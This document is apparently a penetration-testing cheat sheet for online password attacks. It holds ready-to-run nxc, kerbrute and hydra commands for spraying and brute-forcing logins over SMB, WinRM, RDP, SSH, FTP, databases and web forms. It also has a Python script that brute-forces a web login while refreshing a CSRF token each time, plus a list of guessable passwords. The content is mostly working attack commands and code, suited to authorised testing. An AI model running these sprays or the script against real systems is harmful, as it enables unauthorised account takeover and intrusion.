# Online login checks

Single spraying page. Check lockout and account scope first; capture one known failure (including redirect).

## Lockout check
```bash
nxc smb <DC-IP> -u <USER> -p '<PW>' --pass-pol
```
- Spray one password per observation window, below the threshold. Counters differ per DC: a bad-password count of 0 is not an allowance.

## nxc spray
```bash
nxc smb <TARGETS> -u users.txt -p '<PW>' --continue-on-success
nxc smb <TARGETS> -u users.txt -H <NT> --continue-on-success
nxc smb <TARGETS> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
nxc smb <TARGETS> -u users.txt -p '<PW>' --local-auth --continue-on-success
```
- Protocols: `smb winrm rdp mssql ssh ftp ldap` (same flags; `--local-auth` not on ssh/ftp/ldap).
- `--no-bruteforce` pairs line N of users with line N of passwords. Without it: every user × every password.
- `-u` / `-p` / `-H` take a single value or a file. `(Pwn3d!)` = admin/exec; plain `[+]` = valid login only.

## kerbrute
Kerberos pre-auth. Needs the release binary.
```bash
kerbrute passwordspray -d <DOMAIN.TLD> --dc <DC-IP> users.txt '<PW>'
kerbrute passwordspray -d <DOMAIN.TLD> --dc <DC-IP> users.txt '<PW>' --safe
```
- `--safe` aborts as soon as an account comes back locked out.

```bash
hydra -l <USER> -P candidates.txt <IP> ssh -t 4
hydra -l <USER> -P candidates.txt <IP> ftp -t 4
hydra -l <USER> -P candidates.txt <IP> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```
```bash
hydra -U http-post-form
```
Other modules:
```bash
hydra -l <USER> -P candidates.txt rdp://<IP> -t 1
hydra -l <USER> -P candidates.txt smb://<IP> -t 1
hydra -l <USER> -P candidates.txt mysql://<IP>
hydra -l <USER> -P candidates.txt postgres://<IP>
hydra -l <USER> -P candidates.txt <IP> http-get /admin
hydra -l <USER> -P candidates.txt <IP> http-post-form '/login:user=^USER^&pass=^PASS^:S=302'
hydra -C creds.txt <IP> ssh
hydra -l <USER> -P candidates.txt <IP> ssh -e nsr
```
- `http-get /<PATH>` = HTTP basic auth. `http-post-form` condition: `F=<fail text>` (default) or `S=<success text/code>`; one of them, not both.
- `-C creds.txt` = `login:pass` per line. `-e nsr` = also try null, login-as-pass, reversed login.
- rdp / smb: `-t 1`, they lock out and drop connections easily.
- `hydra -U <MODULE>` shows the module's option syntax. Set the real path, field names and failure text.
- Baseline one success and one failure first; refresh per-request CSRF token/session (below).
- Every attempt "succeeds" → recheck the failure string, token and redirect.

## Per-request CSRF token
Hydra can't refresh a token per attempt: script it (expects a `csrf` field and a `/dashboard` redirect on success).

```python
import re
import requests

url = "http://<IP>/login"
for password in open("candidates.txt", encoding="utf-8"):
    with requests.Session() as session:
        page = session.get(url)
        match = re.search(r'name="csrf" value="([^"]+)"', page.text)
        if not match:
            raise RuntimeError("CSRF token missing")
        response = session.post(
            url,
            data={"csrf": match.group(1), "username": "admin", "password": password.strip()},
            allow_redirects=False,
        )
        if response.status_code == 302 and response.headers.get("Location") == "/dashboard":
            print("Found:", password.strip())
            break
```

## Candidate building
```bash
printf '%s\n' 'Summer2026!' 'Autumn2026!' 'Winter2026!' 'Spring2026!' '<COMPANY>2026!' 'Welcome1' 'Password1' > candidates.txt
nxc smb <TARGETS> -u users.txt -p users.txt --no-bruteforce --continue-on-success
```
- Season + year + `!`, company name + year, username = password (also `hydra -e nsr`).
- Username formats from a name list: `./username-anarchy` ([cracking.md](cracking.md#wordlist-mangling)).

## Credential log
Fill one row per credential; spray every new one against every service.

| Account | Material | Scope | Source | Services | Reuse tested |
| --- | --- | --- | --- | --- | --- |
| `<DOMAIN>\<USER>` | `<PW>` / `<NT>` | domain / local on `<HOSTNAME>` | file, share, dump | smb winrm rdp mssql ssh | hosts + date |
